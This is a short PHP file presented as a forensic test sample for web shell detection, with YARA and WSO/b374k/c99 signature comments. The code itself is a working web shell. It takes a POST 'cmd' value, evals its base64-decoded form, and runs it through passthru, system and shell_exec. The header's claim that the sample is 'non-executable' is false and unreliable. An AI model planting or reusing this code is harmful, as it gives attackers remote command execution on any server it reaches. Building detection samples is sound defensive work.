<?php
// CyberTrace Sample Suspicious Artifact for Threat & Forensics Verification
// WARNING: Forensic Test Sample Only - Non-executable
$k = "4f8a9b2c";
if(isset($_POST['cmd'])) {
    $c = $_POST['cmd'];
    @eval(base64_decode($c));
    passthru($c);
    system($c);
    shell_exec($c);
}
// Signature markers for YARA / Web Shell detection
// WSO 4.2.5 Web Shell simulation header
// MD5: 9a01f78c8d8b9e6a0d2f4a5b6c7d8e9f
echo "CyberTrace Forensic Test Sample - WSO / b374k / c99 signature detected";
?>

